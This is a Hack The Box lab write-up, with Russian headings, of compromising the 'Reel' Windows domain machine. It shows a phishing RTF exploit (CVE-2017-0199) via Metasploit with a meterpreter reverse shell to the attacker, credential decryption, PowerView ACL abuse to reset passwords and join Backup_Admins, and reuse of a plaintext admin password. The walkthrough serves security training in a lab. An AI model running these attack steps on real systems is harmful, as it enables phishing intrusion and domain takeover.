---
title: "[HTB] Reel"
permalink: /writeups/htb/reel/
excerpt: "Краткий разбор машины Reel с Hack The Box."
tags:
  - hackthebox
  - htb
  - activedirectory
  - pentest
  - writeup
  - phishing
  - applocker
---

---

{% include toc icon="cog" title="Reel Solution" %}

The [Reel](https://app.hackthebox.com/machines/Reel) machine has been created by [egre55](https://app.hackthebox.com/users/1190). This is an **hard** Windows Machine with a strong focus on Active Directory exploitation. This box was fun, it was nice to finally have a phishing part as well as a small DACL abuse attack chain.
{: .text-justify}

If you didn't solve this challenge and just look for answers, first you should take a look at this [mind map](https://github.com/Orange-Cyberdefense/ocd-mindmaps/blob/main/img/pentest_ad_dark_2023_02.svg) from [Orange Cyberdefense](https://github.com/Orange-Cyberdefense) and try again. It could give you some hints for attack paths when dealing with an Active Directory.

![image-center](/images/htb/htb_reel_infocard.png){: .align-center}

**Заметка:** Все действия против целевой машины выполнялись со стандартной системой *Kali Linux*. Скачать Kali можно с официального сайта [здесь](https://www.kali.org/).
{: .notice--info}

# Разведка

In a penetration test or red team, reconnaissance consists of techniques that involve adversaries actively or passively gathering information that can be used to support targeting. 

This information can then be leveraged by an adversary to aid in other phases of the adversary lifecycle, such as using gathered information to plan and execute initial access, to scope and prioritize post-compromise objectives, or to drive and lead further reconnaissance efforts. Here, our only piece of information is an IP address. 

## Сканирование Nmap

Let's start with a classic service scan with [Nmap](https://nmap.org/) in order to reveal some of the ports open on the machine.

**Заметка:** После запуска HTB-машины всегда подожди несколько минут, чтобы убедиться, что все сервисы поднялись корректно. Если просканировать машину сразу, можно пропустить порты, которые должны быть открыты.
{: .notice--info}

```bash
$ nmap -sV -Pn 10.129.147.8
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-11 11:18 EST
Nmap scan report for 10.129.147.8
Host is up (0.020s latency).
Not shown: 992 filtered tcp ports (no-response)
PORT      STATE SERVICE      VERSION
21/tcp    open  ftp          Microsoft ftpd
22/tcp    open  ssh          OpenSSH 7.6 (protocol 2.0)
25/tcp    open  smtp
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: HTB)
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49159/tcp open  unknown
Service Info: Host: REEL; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 171.76 seconds
```

**Помни:** По умолчанию **Nmap** сканирует 1000 самых распространенных TCP-портов на целевых хостах. Если нужно сканировать больше портов или изменить поведение по умолчанию, обязательно прочитай [документацию](https://nmap.org/docs.html).
{: .notice--warning}

We have a few interesting ports, including **SSH** (22/TCP), **FTP** (21/TCP) and **SMTP** (25/TCP). Let's dig a bit more.

## Anonymous FTP

After playing around with Nmap [scripts](https://nmap.org/nsedoc/scripts/ftp-anon.html), we found an [anonymous FTP](https://datatracker.ietf.org/doc/html/rfc1635) access.

```bash
$ nmap -p 21 --script=ftp-anon -Pn 10.129.147.8
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-04 09:43 EDT
Nmap scan report for 10.129.147.8
Host is up (0.015s latency).

PORT   STATE SERVICE
21/tcp open  ftp
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_05-29-18  12:19AM       <DIR>          documents

Nmap done: 1 IP address (1 host up) scanned in 0.38 seconds
```

An anonymous account accepts any string as a password and has limited access rights to an FTP server, but enough to be able to retrieve content.

```bash
$ ftp 10.129.147.8
Connected to 10.129.147.8.
220 Microsoft FTP Service
Name (10.129.147.8:ax): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||41000|)
125 Data connection already open; Transfer starting.
05-28-18  11:19PM       <DIR>          documents
226 Transfer complete.
ftp> cd documents
250 CWD command successful.
ftp> dir
229 Entering Extended Passive Mode (|||41001|)
125 Data connection already open; Transfer starting.
05-28-18  11:19PM                 2047 AppLocker.docx
05-28-18  01:01PM                  124 readme.txt
10-31-17  09:13PM                14581 Windows Event Forwarding.docx
226 Transfer complete.
ftp> 
```

Here, we found a bunch of documents on the FTP server. Let's start with the **readme.txt** file.

```bash
$ cat readme.txt         
please email me any rtf format procedures - I'll review and convert.

new format / converted documents will be saved here.   
```

It talks about sending RTF documents via email. In our context, it could make sense given the machine has its SMTP (TCP/25) port open. So we will probably need to send an email at some point. 

Now, let's check **AppLocker.docx**. It contains the following text:

```text
AppLocker procedure to be documented - hash rules for exe, 
msi and scripts (ps1,vbs,cmd,bat,js) are in effect.
```

It seems the target computer have some [AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/applocker-overview) rules in place, we may need to bypass this security feature later.

For the last document, **WindowsEventForwarding.docx**, we didn't find anything interesting in it. However, using [exiftool](https://exiftool.org), a metadata reader, we were able to extract an email address.

```bash
$ exiftool WindowsEventForwarding.docx 
ExifTool Version Number         : 12.39
File Name                       : WindowsEventForwarding.docx
Directory                       : .
File Size                       : 14 KiB

...[snipe]...

Zip File Name                   : [Content_Types].xml
Creator                         : nico@megabank.com
Revision Number                 : 4
Create Date                     : 2017:10:31 18:42:00Z
Modify Date                     : 2017:10:31 18:51:00Z
Template                        : Normal.dotm
Total Edit Time                 : 5 minutes
Pages                           : 2
Words                           : 299
```

Here, it seems that our initial foothold will involve a phishing email that is able to bypass some AppLocker rules.

# Первичный доступ

According to the [MITRE](https://attack.mitre.org/techniques/T1566/), adversaries may send victims emails containing malicious attachments or links, typically to execute malicious code on victim systems. 

## CVE-2017-0199

As we need to send an RTF file, it seemed pretty obvious to start with the [CVE-2017-0199](https://www.mandiant.com/resources/cve-2017-0199-hta-handler) exploit, named [office_word_hta](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/windows/fileformat/office_word_hta.md) in Metasploit. 

This module creates a malicious RTF file that, when opened in vulnerable versions of Microsoft Word will lead to code execution. Let's configure this module with Metasploit.

```bash
msf6 exploit(windows/fileformat/office_word_hta) > show options 

Module options (exploit/windows/fileformat/office_word_hta):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   FILENAME  hello.rtf        yes       The file name.
   SRVHOST   10.10.14.20      yes       The local host or network interface to listen on.
   SRVPORT   8080             yes       The local port to listen on.
   SSL       false            no        Negotiate SSL for incoming connections
   SSLCert                    no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH   default.hta      yes       The URI to use for the HTA file


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     tun0             yes       The listen address (an interface may be specified)
   LPORT     443              yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Microsoft Office Word
```

Now, we just need to enter the `exploit` command to generate the malicious file and start the listener.

```bash
msf6 exploit(windows/fileformat/office_word_hta) > exploit 
[*] Exploit running as background job 1.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.14.xx:443 
[+] hello.rtf stored at /root/.msf4/local/hello.rtf
[*] Using URL: http://10.10.14.xx:8080/default.hta
[*] Server started.
```

Note that our malicious file is stored in **/root/.msf4/local/hello.rtf**. Now, using [swaks](http://www.jetmore.org/john/code/swaks/), an SMTP test tool, we can send our payload to **nico@megabank.com**.

```bash
$ sudo swaks --to nico@megabank.com --server 10.129.147.8 --attach /root/.msf4/local/hello.rtf
[sudo] password for ax: 
*** DEPRECATION WARNING: Inferring a filename from the argument to --attach will be removed in the future.  Prefix filenames with '@' instead.
=== Trying 10.129.147.8:25...
=== Connected to 10.129.147.8.
<-  220 Mail Service ready
 -> EHLO nms
<-  250-REEL
<-  250-SIZE 20480000
<-  250-AUTH LOGIN PLAIN
<-  250 HELP
 -> MAIL FROM:<root@nms>
<-  250 OK
 -> RCPT TO:<nico@megabank.com>
<-  250 OK
 -> DATA
<-  354 OK, send.
 -> Date: Fri, 11 Feb 2022 13:17:58 -0500
 -> To: nico@megabank.com
 -> From: root@nms
 -> Subject: test Fri, 11 Feb 2022 13:17:58 -0500

...[snip]...

 -> 
 -> .
<-  250 Queued (12.109 seconds)
 -> QUIT
<-  221 goodbye
=== Connection closed with remote host.
```

After waiting a few seconds, we should get a remote shell on the target machine.

```bash
msf6 exploit(windows/fileformat/office_word_hta) > 
[*] Sending stage (175174 bytes) to 10.129.147.8
[*] Meterpreter session 1 opened (10.10.14.20:443 -> 10.129.147.8:49509) at 2022-06-04 10:20:04 -0400

msf6 exploit(windows/fileformat/office_word_hta) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > sysinfo 
Computer        : REEL
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_GB
Domain          : HTB
Logged On Users : 6
Meterpreter     : x86/windows
```

Nice, we now have a remote shell and our **first flag**.

# Повышение привилегий

Privilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permissions to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities.

## Reading Creds

Looking around nico's **Desktop** folder, we found a file named **cred.xml**.

```bash
meterpreter > ls C:\\Users\\nico\\Desktop
Listing: C:\Users\nico\Desktop
==============================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100444/r--r--r--  1468  fil   2017-10-27 19:59:16 -0400  cred.xml
100666/rw-rw-rw-  282   fil   2017-10-27 18:42:45 -0400  desktop.ini
100444/r--r--r--  32    fil   2017-10-27 19:40:33 -0400  user.txt
100666/rw-rw-rw-  162   fil   2017-10-27 17:34:38 -0400  ~$iledDeliveryNotification.doc
```

The file contains a **PSCredential** object with an encrypted password for **Tom**.

```xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">HTB\Tom</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692</SS>
    </Props>
  </Obj>
</Objs>
```

Thanks to PowerShell and the corresponding Metasploit module,. we can [easily](https://mcpmag.com/articles/2017/07/20/save-and-read-sensitive-data-with-powershell.aspx) retrieve the cleartext password.

```bash
meterpreter > load powershell 
Loading extension powershell...Success.         
meterpreter > powershell_shell 
PS > $credential = Import-CliXml -Path c:\users\nico\desktop\cred.xml
PS > $credential.GetNetworkCredential().Password
1ts-mag1c!!!
PS > 
```

We didn't get any access using WinRM/SMB with these credentials, however, the remote machine does have an **SSH** (TCP/22) server running. Let's see if **tom** can use the service.

```
$ ssh tom@10.129.147.8   
tom@10.129.147.8's password: 


Microsoft Windows [Version 6.3.9600]                                                                                            
(c) 2013 Microsoft Corporation. All rights reserved.    

tom@REEL C:\Users\tom> 
```

Nice, we have access to the remote machine through SSH.

## ACL Abuse

Digging through Tom's folders, we found some files related to BloodHound, including the result of a previous scan.

```bash
tom@REEL C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors>dir                                                                 
 Volume in drive C has no label.                                                                                                
 Volume Serial Number is CC8A-33E1                                                                                              

 Directory of C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors                                                                

05/29/2018  07:57 PM    <DIR>          .                                                                                        
05/29/2018  07:57 PM    <DIR>          ..                                                                                       
11/16/2017  11:50 PM           112,225 acls.csv                                                                                 
10/28/2017  08:50 PM             3,549 BloodHound.bin                                                                           
10/24/2017  03:27 PM           246,489 BloodHound_Old.ps1                                                                       
10/24/2017  03:27 PM           568,832 SharpHound.exe                                                                           
10/24/2017  03:27 PM           636,959 SharpHound.ps1                                                                           
               5 File(s)      1,568,054 bytes                                                                                   
               2 Dir(s)  15,741,628,416 bytes free                                                                              
```

The **acls.csv** file contains ACL related to the domain. We can easily grep some interesting data manually with PowerShell. Let's start with **tom**

```bash
tom@REEL C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors>powershell        

PS C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors> Get-Content .\acls.csv | Select-String -Pattern tom                      

...[snip]...                                 

"claire@HTB.LOCAL","USER","","tom@HTB.LOCAL","USER","WriteOwner","","AccessAllowed","False"                                     
```

Here we can see that, **tom** has the *WriteOwner* permission over **claire** which means we can change the object owner to take over the object. Basically, we own **claire**. Let's see what this user can do.


```bash
PS C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors> Get-Content .\acls.csv | Select-String -Pattern claire                   

...[snip]...

"Backup_Admins@HTB.LOCAL","GROUP","","claire@HTB.LOCAL","USER","WriteDacl","","AccessAllowed","False"                           
```

That's really interesting, **claire** has *WriteDacl* privileges over **Backup_Admins** which means we could modify object's ACEs and take over  **Backup_Admins**.

Let's abuse the *WriteOwner* permission **tom** has over **claire**. Here, we used the *PowerView.ps1* PowerShell script that was already present on the machine. As a reminder, [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) is a tool that helps to gain network situational awareness on Windows domains, but it also has some interesting functionality.

```bash
PS C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors> cd .. 
PS C:\Users\tom\Desktop\AD Audit\BloodHound> dir                                                                                


    Directory: C:\Users\tom\Desktop\AD Audit\BloodHound                                                                         


Mode                LastWriteTime     Length Name                                                                               
----                -------------     ------ ----                                                                               
d----         5/29/2018   8:57 PM            Ingestors                                                                          
-a---        10/30/2017  10:15 PM     769587 PowerView.ps1

```

Here, the *PowerView.ps1* module is imported in our PowerShell session. Using [Set-DomainObjectOwner](https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainObjectOwner/) we can modify the owner of **claire** and set it to **tom**. Given we have full control over **claire**, we can use the [Add-DomainObjectAcl](https://powersploit.readthedocs.io/en/latest/Recon/Add-DomainObjectAcl/) command to allow **tom** to reset claire's password.

Finally, we can use the [Set-DomainUserPassword](https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainUserPassword/) command to modify claire's password.

```bash
PS C:\Users\tom\Desktop\AD Audit\BloodHound> Import-Module .\PowerView.ps1
PS C:\Users\tom\Desktop\AD Audit\BloodHound> Set-DomainObjectOwner -Identity claire -OwnerIdentity tom
PS C:\Users\tom\Desktop\AD Audit\BloodHound> Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword
PS C:\Users\tom\Desktop\AD Audit\BloodHound> $creds = ConvertTo-SecureString 'Qwerty123!' -AsPlainText -Force
PS C:\Users\tom\Desktop\AD Audit\BloodHound> Set-DomainUserPassword -identity claire -accountpassword $creds -Verbose           
VERBOSE: [Set-DomainUserPassword] Attempting to set the password for user 'claire'                                              
VERBOSE: [Set-DomainUserPassword] Password for user 'claire' successfully reset   
```

Let's sse if we can get an SSH access with **claire** domain account.

```bash
$ ssh claire@10.129.147.8
claire@10.129.147.8's password: 

Microsoft Windows [Version 6.3.9600]                                                                                            
(c) 2013 Microsoft Corporation. All rights reserved.     

claire@REEL C:\Users\claire>
```

Yep! Now, given **claire** has *WriteDacl* privileges over **Backup_Admins**, we can add our account to this group.

```bash
claire@REEL C:\Users\claire>net group backup_admins claire /add                                                                  
The command completed successfully.                                                                                             

claire@REEL C:\Users\claire> net group backup_admins                                                                              
Group name     Backup_Admins                                                                                                    
Comment                                                                                                                         

Members                                                                                                                         

-------------------------------------------------------------------------------                                                 
claire                   ranj                                                                                                   
The command completed successfully.                 
```

Done and done.

## Getting the admin password

After some unsuccessful escalation paths, we found something interesting. Being a member of the **Backup_Admins** group gives us a full (F) access over the *C:\Users\Administrator* folder.

Note that we used the [icacls](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls) command to display discretionary access control lists (DACLs) on the specified folder.

```bash
claire@REEL C:\Users>icacls Administrator
Administrator NT AUTHORITY\SYSTEM:(OI)(CI)(F)
              HTB\Backup_Admins:(OI)(CI)(F)
              HTB\Administrator:(OI)(CI)(F)
              BUILTIN\Administrators:(OI)(CI)(F)

Successfully processed 1 files; Failed processing 0 files
```

Cool, we should be able to read the *root.txt* file.

```bash
claire@REEL c:\Users\Administrator\Desktop>type root.txt                                                                        
Access is denied.                                                                                                               
```

Or not. We may be missing some privileges... However, we have access to another folder, **Backup Scripts**.

```bash
claire@REEL c:\Users\Administrator\Desktop>cd "Backup Scripts"                                                                  

claire@REEL c:\Users\Administrator\Desktop\Backup Scripts>dir                                                                   
 Volume in drive C has no label.                                                                                                
 Volume Serial Number is CC8A-33E1                                                                                              

 Directory of c:\Users\Administrator\Desktop\Backup Scripts                                                                     

11/02/2017  09:47 PM    <DIR>          .                                                                                        
11/02/2017  09:47 PM    <DIR>          ..                                                                                       
11/03/2017  11:22 PM               845 backup.ps1                                                                               
11/02/2017  09:37 PM               462 backup1.ps1                                                                              
11/03/2017  11:21 PM             5,642 BackupScript.ps1                                                                         
11/02/2017  09:43 PM             2,791 BackupScript.zip                                                                         
11/03/2017  11:22 PM             1,855 folders-system-state.txt                                                                 
11/03/2017  11:22 PM               308 test2.ps1.txt                                                                            
               6 File(s)         11,903 bytes                                                                                   
               2 Dir(s)  15,738,982,400 bytes free                                                                              
```

The folder contains multiple scripts and one of them had interesting information in it.

```bash
claire@REEL c:\Users\Administrator\Desktop\Backup Scripts>type BackupScript.ps1                                                 
# admin password                                                                                                                
$password="Cr4ckMeIfYouC4n!"                                                                                                    

#Variables, only Change here                                                                                                    
$Destination="\\BACKUP03\BACKUP" #Copy the Files to this Location            
```

Let's see if this password works with the **administrator** account.

```bash
$ ssh administrator@10.129.147.8
administrator@10.129.147.8's password: 
Microsoft Windows [Version 6.3.9600]                                                                                            
(c) 2013 Microsoft Corporation. All rights reserved.                                                                            

administrator@REEL C:\Users\Administrator>                                                                          

administrator@REEL C:\Users\Administrator\Desktop>ls                                                                            
'ls' is not recognized as an internal or external command,                                                                      
operable program or batch file.                                                                                                 

administrator@REEL C:\Users\Administrator\Desktop>dir                                                                           
 Volume in drive C has no label.                                                                                                
 Volume Serial Number is CC8A-33E1                                                                                              

 Directory of C:\Users\Administrator\Desktop                                                                                    

21/01/2018  14:56    <DIR>          .                                                                                           
21/01/2018  14:56    <DIR>          ..                                                                                          
02/11/2017  21:47    <DIR>          Backup Scripts                                                                              
28/10/2017  11:56                32 root.txt                                                                                    
               1 File(s)             32 bytes                                                                                   
               3 Dir(s)  15,738,458,112 bytes free                                                                              
```

We now have access to the **second flag**.

Awesome! I hope you enjoyed it, I know I did :)
